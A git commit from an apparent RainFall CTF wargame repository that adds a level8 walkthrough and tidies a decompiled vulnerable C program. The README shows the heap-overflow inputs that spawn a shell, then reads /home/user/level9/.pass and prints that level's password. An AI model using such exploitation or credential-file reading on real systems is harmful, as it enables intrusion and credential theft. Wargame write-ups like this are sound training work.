d110c68a3a9bf589b789dfc090d165d88f3c628c
Haksell <axel.brisse@gmail.com>
2025-12-07 09:59:38 +0100

    level8 ez

--- README.md
+++ README.md
@@ -689,3 +689,19 @@ level7@RainFall:~$ ./level7 $(python -c 'print("w" * 20 + "\x28\x99\x04\x08")') 
 ```
 
 ## level8
+
+```console
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth axel
+0x804a008, (nil) 
+service!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+0x804a008, 0x804a018 
+login
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
+
+auth[32] overflows and reads in service
--- level8.c
+++ level8.c
@@ -1,3 +1,4 @@
+#include <stdbool.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -6,25 +7,23 @@ char* auth;
 char* service;
 
 int main() {
-    char s[5];
-    char v5[2];
-    char v6[129];
+    char buf[128];
 
-    while (1) {
-        printf("%p, %p \n", auth, (const void*)service);
-        if (!fgets(s, 128, stdin)) break;
-        if (!memcmp(s, "auth ", 5)) {
+    while (true) {
+        printf("%p, %p \n", auth, service);
+        if (!fgets(buf, 128, stdin)) break;
+        if (!strncmp(buf, "auth ", 5)) {
             auth = malloc(4);
             auth[0] = 0;
-            if (strlen(v5) <= 0x1E) strcpy(auth, v5);
+            if (strlen(buf + 5) <= 30) strcpy(auth, buf + 5);
         }
-        if (!memcmp(s, "reset", 5)) free(auth);
-        if (!memcmp(s, "service", 6)) service = strdup(v6);
-        if (!memcmp(s, "login", 5)) {
+        if (!strncmp(buf, "reset", 5)) free(auth);
+        if (!strncmp(buf, "service", 6)) service = strdup(buf + 7);
+        if (!strncmp(buf, "login", 5)) {
             if (auth[32]) {
                 system("/bin/sh");
             } else {
-                fwrite("Password:\n", 1u, 0xAu, stdout);
+                fwrite("Password:\n", 1, 10, stdout);
             }
         }
     }
